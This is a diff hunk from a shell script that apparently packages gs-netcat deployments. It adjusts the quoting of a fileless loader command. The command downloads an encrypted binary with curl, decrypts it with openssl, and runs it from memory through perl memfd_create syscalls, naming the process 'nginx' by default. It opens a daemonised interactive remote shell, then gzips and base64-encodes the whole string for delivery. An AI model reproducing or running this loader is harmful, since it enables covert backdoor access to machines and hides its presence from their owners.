@@ -226,7 +226,7 @@ sed 's|^GS_WEBHOOK_404_OK=.*|GS_WEBHOOK_404_OK=1|' -i "${DATA_DIR_BRANCH}/${DEPL
 [ -n "$GS_BIN" ]    &&  sed 's|^DS_GS_BIN=.*|DS_GS_BIN='"'$GS_BIN'"'|' -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
 
 # memexec string:
-MEMCMD="X=\"\$(head -c64</dev/urandom|base64|tr -dc [:alnum:]|head -c22)\" && curl -SskfL \"${URL_BASE:-https://BAD}${URL_BRANCH}/bin/gs-netcat_mini-linux-\$(uname -m).enc?s=\$X\"|openssl enc -d -aes-256-cbc -pbkdf2 -k ${ENCPASS}|GS_NOFFPID=1 GS_ARGS=\"-ilD -s\${X}\"${GS_BEACON:+ GS_BEACON=$GS_BEACON}${GS_HOST:+ GS_HOST=$GS_HOST}${GS_PORT:+ GS_PORT=$GS_PORT} perl '"'-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}'"${GS_NAME:-nginx}"',@ARGV'"'"
+MEMCMD="X=\"\$(head -c64</dev/urandom|base64|tr -dc [:alnum:]|head -c22)\" && curl -SskfL \"${URL_BASE:-https://BAD}${URL_BRANCH}/bin/gs-netcat_mini-linux-\$(uname -m).enc?s=\$X\"|openssl enc -d -aes-256-cbc -pbkdf2 -k ${ENCPASS}|GS_NOFFPID=1 GS_ARGS=\"-ilD -s\${X}\"${GS_BEACON:+ GS_BEACON=$GS_BEACON}${GS_HOST:+ GS_HOST=$GS_HOST}${GS_PORT:+ GS_PORT=$GS_PORT} perl '"'-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"'"${GS_NAME:-nginx}"'",@ARGV'"'"
 MEMCMD64="$(gzip<<<"${MEMCMD}" | base64 -w0)"
 
 echo -e "${CDG}SUCCESS${CN}"
